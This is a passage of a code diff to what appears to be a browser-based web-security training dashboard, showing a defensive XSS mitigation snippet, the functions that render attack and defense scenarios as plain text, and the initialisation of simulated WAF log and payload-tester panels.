+        code:'// Server-side output encoding (PHP):\n$safe = htmlspecialchars($comment, ENT_QUOTES, "UTF-8");\n\n// Content-Security-Policy header:\nContent-Security-Policy: default-src \'self\'; script-src \'self\'\n\n// Cookie:\nSet-Cookie: SESS=value; HttpOnly; SameSite=Strict' },
+    ]},
+];
+
+let activeScenario = null;
+let stepIndex = -1;
+
+function buildScenarios() {
+  const list = document.getElementById('scenario-list');
+  SCENARIOS.forEach((sc, i) => {
+    const el = document.createElement('div');
+    el.className = 'scenario';
+    el.addEventListener('click', () => loadScenario(i));
+    const title = document.createElement('div');
+    title.className = 'sc-title';
+    title.textContent = sc.name + '  [' + sc.type + ']';
+    const desc = document.createElement('div');
+    desc.className = 'sc-desc';
+    desc.textContent = sc.desc;
+    el.appendChild(title);
+    el.appendChild(desc);
+    list.appendChild(el);
+  });
+}
+
+function loadScenario(i) {
+  activeScenario = SCENARIOS[i];
+  stepIndex = -1;
+  document.querySelectorAll('.scenario').forEach((el, idx) =>
+    el.classList.toggle('active', idx === i));
+  document.getElementById('sim-title').textContent = activeScenario.name + ' — Step-by-Step';
+  document.getElementById('run-btn').style.display = '';
+  renderScenario();
+}
+
+function renderScenario() {
+  const out = document.getElementById('sim-output');
+  out.innerHTML = '';
+
+  const descEl = document.createElement('div');
+  descEl.style.cssText = 'color:var(--dim);font-size:11px;margin-bottom:12px';
+  descEl.textContent = activeScenario.desc;  // textContent
+  out.appendChild(descEl);
+
+  activeScenario.steps.forEach((step, i) => {
+    const item = document.createElement('div');
+    item.className = 'step-item ' + step.kind;
+    item.style.opacity = stepIndex >= 0 && i > stepIndex ? '0.3' : '1';
+    if (stepIndex === i) item.style.outline = '2px solid ' + (step.kind === 'attack' ? 'var(--red)' : step.kind === 'defense' ? 'var(--green)' : 'var(--accent)');
+
+    const numEl = document.createElement('div');
+    numEl.className = 'step-num';
+    numEl.textContent = i + 1;
+
+    const content = document.createElement('div');
+    const txtEl = document.createElement('div');
+    txtEl.className = 'step-text';
+    txtEl.textContent = step.txt;  // textContent
+    const codeEl = document.createElement('div');
+    codeEl.className = 'step-code';
+    codeEl.textContent = step.code;  // textContent — all code displayed as plain text
+
+    content.appendChild(txtEl);
+    content.appendChild(codeEl);
+    item.appendChild(numEl);
+    item.appendChild(content);
+    out.appendChild(item);
+  });
+}
+
+function runScenario() {
+  if (!activeScenario) return;
+  stepIndex = (stepIndex + 1) % activeScenario.steps.length;
+  renderScenario();
+}
+
+// ─────────────────────────────────────────────────────────────────────────────
+// INIT
+// ─────────────────────────────────────────────────────────────────────────────
+function init() {
   buildPayloadTester();
   buildTIFeed();
   buildScenarios();
-  // Start WAF log feed
-  for(let i=0;i<12;i++) addLog();
+  for (let i = 0; i < 12; i++) addLog();
   setInterval(addLog, 2200);
-  setInterval(addLog, 3800);
+  setInterval(addLog, 3900);
 }
 
-window.onload=init;
+window.onload = init;
 </script>
 </body>
 </html>
